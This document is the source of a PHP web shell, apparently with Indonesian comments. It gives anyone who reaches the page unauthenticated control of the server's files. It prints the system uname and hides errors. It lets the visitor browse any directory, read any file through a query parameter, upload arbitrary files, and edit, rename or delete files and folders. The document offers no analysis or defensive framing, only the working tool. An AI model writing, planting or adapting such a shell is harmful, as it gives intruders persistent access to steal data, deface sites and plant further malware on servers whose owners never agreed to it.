<?php
header("X-XSS-Protection: 0");
ob_start();
set_time_limit(0);
error_reporting(0);
ini_set('display_errors', FALSE);

echo '<html>
<center>
<body>
<table width="100%" border="0" cellpadding="0" cellspacing="0" align="center">
';
echo "<font color='green'>".@php_uname()."</font>";
echo '</center>';
echo '<table width="100%" border="0" cellpadding="0" cellspacing="0" align="center">
<tr align="center"><td align="center"><br>';

if(isset($_GET['j'])){
    $j = $_GET['j'];
}else{
    $j = getcwd();
}
$j = str_replace('\\','/',$j);

// Breadcrumb
$paths = explode('/',$j);
foreach($paths as $id=>$pat){
    if($pat == '' && $id == 0){
        echo '<a href="?j=/">/</a>';
        continue;
    }
    if($pat == '') continue;
    echo '<a href="?j=';
    for($i=0;$i<=$id;$i++){
        echo "$paths[$i]";
        if($i != $id) echo "/";
    }
    echo '">'.$pat.'</a>/';
}

echo '<br><br><br><font color="black"><form enctype="multipart/form-data" method="POST"><input type="file" name="file" style="color:black;;" required/></font>
<input type="submit" value="U" style="width:85px;height:25px"/>';

if(isset($_FILES['file'])){
    $target = $j.'/'.$_FILES['file']['name'];
    if(@copy($_FILES['file']['tmp_name'], $target)){
        echo '<br><br><font color="green">OK</font><br/>';
    }else{
        echo '<script>alert("NO")</script>';
    }
}
echo '</form>';

if(isset($_GET['filesrc'])){
    $file = $_GET['filesrc'];
    if(file_exists($file) && is_file($file)){
        echo "<br />";
        echo '<textarea style="font-size: 8px; border: 1px solid white; background-color: green; color: white; width: 100%;height: 500px;" readonly> '.htmlspecialchars(@file_get_contents($file)).'</textarea>';
    }
}elseif(isset($_GET['option']) && isset($_POST['opt']) && $_POST['opt'] != 'delete'){
    echo '<br /><center>'.$_POST['j'].'<br /><br />';
    if($_GET['opt'] == 'btw'){
        $cwd = getcwd();
        echo '<form action="?option&j='.$cwd.'&opt=delete&type=buat" method="POST"><input name="name" type="text" size="25" value="Folder" style="width:300px; height: 30px;"/>
        <input type="hidden" name="j" value="'.$cwd.'">
        <input type="hidden" name="opt" value="delete">
        <input type="submit" value=">>>" style="width:100px; height: 30px;"/>
        </form>';
    }
    elseif($_POST['opt'] == 'rename'){
        if(isset($_POST['newname'])){
            if(@rename($_POST['j'], dirname($_POST['j']).'/'.$_POST['newname'])){
                echo '<br><br><font color="green">OK</font><br/>';
            }else{
                echo '<script>alert("NO")</script>';
            }
            $_POST['name'] = $_POST['newname'];
        }
        echo '<form method="POST"><input name="newname" type="text" size="5" style="width:20%; height:30px;" value="'.@$_POST['name'].'" />
        <input type="hidden" name="j" value="'.$_POST['j'].'">
        <input type="hidden" name="opt" value="rename">
        <input type="submit" value=">>>" style="height:30px;" />
        </form>';
    }
    elseif($_POST['opt'] == 'edit'){
        if(isset($_POST['src'])){
            $fp = @fopen($_POST['j'],'w');
            if($fp){
                @fwrite($fp,$_POST['src']);
                @fclose($fp);
                echo '<br><br><font color="green">OK</font><br/>';
            }else{
                echo '<script>alert("NO")</script>';
            }
        }
        $content = @file_get_contents($_POST['j']);
        echo '<form method="POST">
        <textarea cols=80 rows=20 name="src" style="font-size: 8px; border: 1px solid white; background-color: green; color: white; width: 100%;height: 500px;">'.htmlspecialchars($content).'</textarea><br />
        <input type="hidden" name="j" value="'.$_POST['j'].'">
        <input type="hidden" name="opt" value="edit">
        <input type="submit" value=">>>" style="height:30px; width:70px;"/>
        </form>';
    }
    echo '</center>';
}else{
    echo '<br /><center>';
    if(isset($_GET['option']) && isset($_POST['opt']) && $_POST['opt'] == 'delete'){
        if($_POST['type'] == 'g'){
            if(@rmdir($_POST['j'])){
                echo '<br><br><font color="green">OK</font><br/>';
            }else{
                echo '<script>alert("NO")</script>';
            }
        }
        elseif($_POST['type'] == 'file'){
            if(@unlink($_POST['j'])){
                echo '<br><br><font color="green">OK</font><br/>';
            }else{
                echo '<script>alert("NO")</script>';
            }
        }
    }
    echo '</center>';
    
    // MENAMPILKAN LIST DIRECTORY - PAKAI CARA YANG SUDAH TERBUKTI BERHASIL
    echo '<div id="content"><table width="95%" border="0" cellpadding="3" cellspacing="1" align="center">';
    
    // Baca direktori dengan opendir (cara yang sudah berhasil)
    if ($handle = @opendir($j)) {
        $dirs = array();
        $files = array();
        
        while (false !== ($entry = @readdir($handle))) {
            if ($entry != "." && $entry != "..") {
                $full = $j . "/" . $entry;
                if (@is_dir($full)) {
                    $dirs[] = $entry;
                } else {
                    $files[] = $entry;
                }
            }
        }
        @closedir($handle);
        
        sort($dirs);
        sort($files);
        
        // Tampilkan folder
        foreach($dirs as $g){
            echo "<tr>
            <td>D<a href=\"?j=$j/$g\"> $g</a></td>
            <td><center>D</center></td>
            <td><center>";
            if(@is_writable($j.'/'.$g)) echo '<font color="black">';
            elseif(!@is_readable($j.'/'.$g)) echo '<font color="red">';
            echo "755";
            if(@is_writable($j.'/'.$g) || !@is_readable($j.'/'.$g)) echo '</font>';
            echo "</center></td>
            <td align=right> <form method=\"POST\" action=\"?option&j=$j\">
            <select name=\"opt\">
            <option value=\"Action\">+</option>
            <option value=\"delete\">Delete</option>
            <option value=\"rename\">Rename</option>
            </select>
            <input type=\"hidden\" name=\"type\" value=\"g\">
            <input type=\"hidden\" name=\"j\" value=\"$j/$g\">
            <input type=\"submit\" value=\">\"/>
            </form></td>
            </tr>";
        }
        
        // Tampilkan file
        foreach($files as $file){
            $size = @filesize($j.'/'.$file)/1024;
            $size = round($size,3);
            if($size >= 1024){
                $size = round($size/1024,2).' MB';
            }else{
                $size = $size.' KB';
            }
            echo "<tr>
            <td>F<a href=\"?filesrc=$j/$file&j=$j\"> $file</a></td>
            <td><center>".$size."</center></td>
            <td><center>";
            if(@is_writable($j.'/'.$file)) echo '<font color="green">';
            elseif(!@is_readable($j.'/'.$file)) echo '<font color="red">';
            echo "644";
            if(@is_writable($j.'/'.$file) || !@is_readable($j.'/'.$file)) echo '</font>';
            echo "</center></td>
            <td align=right> <form method=\"POST\" action=\"?option&j=$j\">
            <select name=\"opt\">
            <option value=\"Action\">+</option>
            <option value=\"delete\">Delete</option>
            <option value=\"edit\">Edit</option>
            <option value=\"rename\">Rename</option>
            </select>
            <input type=\"hidden\" name=\"type\" value=\"file\">
            <input type=\"hidden\" name=\"name\" value=\"$file\">
            <input type=\"hidden\" name=\"j\" value=\"$j/$file\">
            <input type=\"submit\" value=\">\"/>
            </form></td>
            </tr>";
        }
        
        if(empty($dirs) && empty($files)){
            echo "<tr><td colspan='4'><center>Directory is empty</center></td></tr>";
        }
        
    } else {
        echo "<tr><td colspan='4'><center><font color='red'>Cannot read directory: $j</font></center></td></tr>";
    }
    
    echo '</table></div>';
}
?>